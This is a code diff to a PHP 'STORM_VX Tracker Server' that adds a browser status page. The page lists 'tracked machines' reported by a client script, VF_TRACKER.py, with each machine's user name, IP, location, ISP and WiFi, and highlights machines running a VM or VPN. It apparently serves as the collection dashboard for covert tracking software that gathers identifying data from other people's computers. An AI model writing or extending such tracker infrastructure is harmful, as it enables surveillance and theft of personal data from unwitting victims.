@@ -31,10 +31,71 @@ define('MAX_LOG_SIZE', 5 * 1024 * 1024);
 // MAIN LOGIC
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Only allow POST requests
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
+// Handle GET requests — show status page (for browser visits)
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    $script_dir = dirname(__FILE__);
+    $log_path = $script_dir . '/' . LOG_DIR;
+
+    // Count reports
+    $report_count = 0;
+    $machine_count = 0;
+    $machines = [];
+    if (is_dir($log_path)) {
+        $files = glob($log_path . '/machine_*.txt');
+        $report_count = count($files);
+    }
+
+    // Read index file
+    $index_data = [];
+    $index_file = $log_path . '/index.txt';
+    if (file_exists($index_file)) {
+        $index_lines = file($index_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $machine_count = count($index_lines);
+        foreach ($index_lines as $line) {
+            $index_data[] = $line;
+        }
+    }
+
+    header('Content-Type: text/html; charset=utf-8');
+    echo '<!DOCTYPE html><html><head><title>STORM_VX Tracker Server</title>';
+    echo '<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}';
+    echo 'h1{color:#00ff00;border-bottom:2px solid #00ff00;padding-bottom:10px}';
+    echo '.box{background:#111;border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px}';
+    echo '.ok{color:#00ff00} .warn{color:#ffff00} .info{color:#00ccff}';
+    echo 'table{width:100%;border-collapse:collapse} td,th{padding:8px;text-align:left;border-bottom:1px solid #222}';
+    echo 'th{color:#00ccff}</style></head><body>';
+    echo '<h1>STORM_VX Tracker Server v3.0</h1>';
+    echo '<div class="box">';
+    echo '<p class="ok">Status: ONLINE</p>';
+    echo '<p>Reports received: <b>' . $report_count . '</b></p>';
+    echo '<p>Unique machines: <b>' . $machine_count . '</b></p>';
+    echo '<p>Server time: ' . date('Y-m-d H:i:s') . '</p>';
+    echo '</div>';
+
+    if (!empty($index_data)) {
+        echo '<div class="box"><h3>Tracked Machines:</h3><table>';
+        echo '<tr><th>Time</th><th>Machine ID</th><th>User</th><th>IP</th><th>Location</th><th>ISP</th><th>WiFi</th></tr>';
+        foreach ($index_data as $line) {
+            echo '<tr>';
+            $parts = explode(' | ', $line);
+            foreach ($parts as $i => $part) {
+                $val = trim($part);
+                // Highlight important fields
+                $class = '';
+                if (strpos($val, 'VM:') !== false && strpos($val, 'YES') !== false) $class = ' class="warn"';
+                if (strpos($val, 'VPN:') !== false && strpos($val, 'YES') !== false) $class = ' class="warn"';
+                echo '<td' . $class . '>' . htmlspecialchars($val) . '</td>';
+            }
+            echo '</tr>';
+        }
+        echo '</table></div>';
+    } else {
+        echo '<div class="box"><p class="info">No reports received yet. Waiting for VF_TRACKER.py to send data...</p></div>';
+    }
+
+    echo '<div class="box"><p class="info">This page is for monitoring only. ';
+    echo 'VF_TRACKER.py sends data via POST automatically.</p></div>';
+    echo '</body></html>';
     exit;
 }
 
